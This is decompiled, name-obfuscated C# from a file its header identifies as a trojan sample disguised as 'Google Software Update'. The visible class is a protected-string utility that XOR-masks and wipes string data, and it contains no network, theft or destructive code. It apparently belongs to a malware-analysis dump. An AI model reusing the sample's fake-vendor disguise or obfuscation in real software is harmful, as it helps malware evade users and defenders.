// Decompiled with JetBrains decompiler
// Type: C3554254475.C2181537457
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace C3554254475
{
  [DebuggerDisplay("{ReadString()}")]
  public sealed class C2181537457
  {
    private C3110715001 C3554254475 = (C3110715001) null;
    private string C3554254475 = (string) null;
    private bool C3554254475;
    private static readonly C2181537457 C3554254475 = new C2181537457();
    private static readonly C2181537457 C3904355907 = new C2181537457(true, new byte[0]);
    private int C3554254475 = -1;

    [SpecialName]
    public static C2181537457 C3554254475() => C2181537457.C3554254475;

    [SpecialName]
    public static C2181537457 C3904355907() => C2181537457.C3904355907;

    [SpecialName]
    public bool C1255198513() => this.C3554254475;

    [SpecialName]
    public bool C1908338681()
    {
      C3110715001 c3554254475 = this.C3554254475;
      if (c3554254475 != null)
        return c3554254475.C1908338681() == 0U;
      Debug.Assert(this.C3554254475 != null);
      return this.C3554254475.Length == 0;
    }

    [SpecialName]
    public int C1037565863()
    {
      if (this.C3554254475 >= 0)
        return this.C3554254475;
      C3110715001 c3554254475 = this.C3554254475;
      if (c3554254475 != null)
      {
        byte[] bytes = c3554254475.C2746444292();
        try
        {
          this.C3554254475 = C1130791706.C1255198513().GetCharCount(bytes);
        }
        finally
        {
          C2137352139.C3904355907(bytes);
        }
      }
      else
      {
        Debug.Assert(this.C3554254475 != null);
        this.C3554254475 = this.C3554254475.Length;
      }
      return this.C3554254475;
    }

    public C2181537457() => this.C3554254475(false, string.Empty);

    public C2181537457([In] bool obj0, [In] string obj1) => this.C3554254475(obj0, obj1);

    public C2181537457([In] bool obj0, [In] byte[] obj1) => this.C3554254475(obj0, obj1);

    public C2181537457([In] bool obj0, [In] C3463352047 obj1)
    {
      if (obj1 == null)
      {
        Debug.Assert(false);
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bq());
      }
      byte[] numArray = obj1.C3904355907();
      try
      {
        this.C3554254475(obj0, numArray);
      }
      finally
      {
        if (obj0)
          C2137352139.C3904355907(numArray);
      }
    }

    private void C3554254475([In] bool obj0, [In] string obj1)
    {
      if (obj1 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C3081909835());
      this.C3554254475 = obj0;
      this.C3554254475 = obj1;
    }

    private void C3554254475([In] bool obj0, [In] byte[] obj1)
    {
      if (obj1 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.@as());
      this.C3554254475 = obj0;
      if (obj0)
        this.C3554254475 = new C3110715001(true, obj1);
      else
        this.C3554254475 = C1130791706.C1255198513().GetString(obj1, 0, obj1.Length);
    }

    public string C112844655()
    {
      if (this.C3554254475 != null)
        return this.C3554254475;
      byte[] bytes = this.C2564639436();
      string str = bytes.Length == 0 ? string.Empty : C1130791706.C1255198513().GetString(bytes, 0, bytes.Length);
      this.C3554254475 = str;
      this.C3554254475 = (C3110715001) null;
      return str;
    }

    public char[] C2746444292()
    {
      if (this.C3554254475 != null)
        return this.C3554254475.ToCharArray();
      byte[] bytes = this.C2564639436();
      char[] chars;
      try
      {
        chars = C1130791706.C1255198513().GetChars(bytes);
      }
      finally
      {
        C2137352139.C3904355907(bytes);
      }
      return chars;
    }

    public byte[] C2564639436()
    {
      C3110715001 c3554254475 = this.C3554254475;
      return c3554254475 != null ? c3554254475.C2746444292() : C1130791706.C1255198513().GetBytes(this.C3554254475);
    }

    public byte[] C3554254475([In] C3904355907.C3568589458 obj0)
    {
      if (obj0 == null)
      {
        Debug.Assert(false);
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Br());
      }
      byte[] numArray1 = this.C2564639436();
      int length = numArray1.Length;
      byte[] numArray2 = obj0.C3554254475((uint) length);
      Debug.Assert(numArray2.Length == length);
      for (int index = 0; index < length; ++index)
        numArray1[index] ^= numArray2[index];
      C2137352139.C3904355907(numArray2);
      return numArray1;
    }

    public C2181537457 C3554254475([In] bool obj0)
    {
      if (obj0 == this.C3554254475)
        return this;
      byte[] numArray = this.C2564639436();
      return new C2181537457(obj0, numArray);
    }

    public bool C3554254475([In] C2181537457 obj0, [In] bool obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.BS());
      if (this == obj0)
        return true;
      bool c3554254475_1 = this.C3554254475;
      bool c3554254475_2 = obj0.C3554254475;
      if (obj1 && c3554254475_1 != c3554254475_2)
        return false;
      if (!c3554254475_1 && !c3554254475_2)
        return this.C112844655() == obj0.C112844655();
      byte[] numArray1 = this.C2564639436();
      byte[] numArray2 = (byte[]) null;
      bool flag;
      try
      {
        numArray2 = obj0.C2564639436();
        flag = C2137352139.C3554254475(numArray1, numArray2);
      }
      finally
      {
        if (c3554254475_1)
          C2137352139.C3904355907(numArray1);
        if (c3554254475_2 && numArray2 != null)
          C2137352139.C3904355907(numArray2);
      }
      return flag;
    }

    public C2181537457 C3554254475([In] int obj0, [In] string obj1)
    {
      if (obj0 < 0)
        throw new ArgumentOutOfRangeException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bs());
      switch (obj1)
      {
        case "":
          return this;
        case null:
          throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.BT());
        default:
          if (!this.C3554254475)
            return new C2181537457(false, this.C112844655().Insert(obj0, obj1));
          UTF8Encoding utF8Encoding = C1130791706.C1255198513();
          char[] sourceArray = this.C2746444292();
          char[] chArray = (char[]) null;
          byte[] bytes = (byte[]) null;
          C2181537457 c2181537457;
          try
          {
            if (obj0 > sourceArray.Length)
              throw new ArgumentOutOfRangeException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bs());
            char[] charArray = obj1.ToCharArray();
            chArray = new char[sourceArray.Length + charArray.Length];
            Array.Copy((Array) sourceArray, 0, (Array) chArray, 0, obj0);
            Array.Copy((Array) charArray, 0, (Array) chArray, obj0, charArray.Length);
            Array.Copy((Array) sourceArray, obj0, (Array) chArray, obj0 + charArray.Length, sourceArray.Length - obj0);
            bytes = utF8Encoding.GetBytes(chArray);
            c2181537457 = new C2181537457(true, bytes);
            Debug.Assert(utF8Encoding.GetString(bytes, 0, bytes.Length) == this.C112844655().Insert(obj0, obj1));
          }
          finally
          {
            C2137352139.C3554254475<char>(sourceArray);
            if (chArray != null)
              C2137352139.C3554254475<char>(chArray);
            if (bytes != null)
              C2137352139.C3904355907(bytes);
          }
          return c2181537457;
      }
    }

    public C2181537457 C3554254475([In] int obj0, [In] int obj1)
    {
      if (obj0 < 0)
        throw new ArgumentOutOfRangeException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bs());
      if (obj1 < 0)
        throw new ArgumentOutOfRangeException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C3187964512());
      if (obj1 == 0)
        return this;
      if (!this.C3554254475)
        return new C2181537457(false, this.C112844655().Remove(obj0, obj1));
      UTF8Encoding utF8Encoding = C1130791706.C1255198513();
      char[] sourceArray = this.C2746444292();
      char[] chArray = (char[]) null;
      byte[] bytes = (byte[]) null;
      C2181537457 c2181537457;
      try
      {
        if (obj0 + obj1 > sourceArray.Length)
          throw new ArgumentException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bt());
        chArray = new char[sourceArray.Length - obj1];
        Array.Copy((Array) sourceArray, 0, (Array) chArray, 0, obj0);
        Array.Copy((Array) sourceArray, obj0 + obj1, (Array) chArray, obj0, sourceArray.Length - (obj0 + obj1));
        bytes = utF8Encoding.GetBytes(chArray);
        c2181537457 = new C2181537457(true, bytes);
        Debug.Assert(utF8Encoding.GetString(bytes, 0, bytes.Length) == this.C112844655().Remove(obj0, obj1));
      }
      finally
      {
        C2137352139.C3554254475<char>(sourceArray);
        if (chArray != null)
          C2137352139.C3554254475<char>(chArray);
        if (bytes != null)
          C2137352139.C3904355907(bytes);
      }
      return c2181537457;
    }

    public static C2181537457 operator +([In] C2181537457 obj0, [In] C2181537457 obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C1505515367());
      if (obj1 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.BU());
      if (obj1.C1908338681())
        return obj0.C3554254475(obj0.C1255198513() || obj1.C1255198513());
      if (obj0.C1908338681())
        return obj1.C3554254475(obj0.C1255198513() || obj1.C1255198513());
      if (!obj0.C1255198513() && !obj1.C1255198513())
        return new C2181537457(false, obj0.C112844655() + obj1.C112844655());
      char[] sourceArray1 = obj0.C2746444292();
      char[] sourceArray2 = (char[]) null;
      char[] chArray = (char[]) null;
      byte[] numArray = (byte[]) null;
      C2181537457 c2181537457;
      try
      {
        sourceArray2 = obj1.C2746444292();
        chArray = new char[sourceArray1.Length + sourceArray2.Length];
        Array.Copy((Array) sourceArray1, (Array) chArray, sourceArray1.Length);
        Array.Copy((Array) sourceArray2, 0, (Array) chArray, sourceArray1.Length, sourceArray2.Length);
        numArray = C1130791706.C1255198513().GetBytes(chArray);
        c2181537457 = new C2181537457(true, numArray);
      }
      finally
      {
        C2137352139.C3554254475<char>(sourceArray1);
        if (sourceArray2 != null)
          C2137352139.C3554254475<char>(sourceArray2);
        if (chArray != null)
          C2137352139.C3554254475<char>(chArray);
        if (numArray != null)
          C2137352139.C3904355907(numArray);
      }
      return c2181537457;
    }

    public static C2181537457 operator +([In] C2181537457 obj0, [In] string obj1)
    {
      C2181537457 c2181537457 = new C2181537457(false, obj1);
      return obj0 + c2181537457;
    }
  }
}
